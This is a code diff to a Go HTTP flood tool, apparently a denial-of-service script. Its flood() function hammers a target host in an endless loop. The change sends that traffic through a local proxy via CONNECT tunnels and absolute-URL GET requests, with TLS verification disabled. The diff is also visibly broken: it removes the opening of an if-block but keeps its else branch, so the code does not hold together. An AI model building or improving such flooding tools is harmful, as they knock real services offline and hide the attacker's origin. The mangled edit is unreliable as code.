@@ -118,6 +118,7 @@ func contain(char string, x string) int { //simple compare
 }
 
 func flood() {
+	proxyAddr := "127.0.0.1:8080"
 	addr := host + ":" + port
 	header := ""
 	if mode == "get" {
@@ -177,14 +178,38 @@ func flood() {
 	var err error
 	<-start //received signal
 	for {
-		if port == "443" {
-			cfg := &tls.Config{
-				InsecureSkipVerify: true,
-				ServerName:         host, //simple fix
-			}
-			s, err = tls.Dial("tcp", addr, cfg)
+		s, err = net.Dial("tcp", proxyAddr)
+		if err != nil {
+			fmt.Println("代理连接失败:", err)
+			continue
+		}
+		connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", addr, addr)
+		s.Write([]byte(connectReq))
+		
+		// 读取代理响应（应返回"HTTP/1.1 200 Connection established"）
+		buf := make([]byte, 1024)
+		n, _ := s.Read(buf)
+		if !strings.Contains(string(buf[:n]), "200") {
+			s.Close()
+			continue
+		}
+		
+		// 在隧道上建立TLS连接
+		cfg := &tls.Config{
+			InsecureSkipVerify: true,
+			ServerName:         host,
+		}
+		s = tls.Client(s, cfg)
+			
 		} else {
-			s, err = net.Dial("tcp", addr)
+			s, err = net.Dial("tcp", proxyAddr)
+			if err != nil {
+				fmt.Println("代理连接失败:", err)
+				continue
+			}
+			// 修改请求行，包含完整URL（例如 GET http://example.com/ HTTP/1.1）
+			request := fmt.Sprintf("GET http://%s%s HTTP/1.1\r\n", addr, page) + header
+			s.Write([]byte(request))
 		}
 		if err != nil {
 			fmt.Println("By Nickyz9400!!!") //When showing this message, it means ur ip got blocked or the target server down.
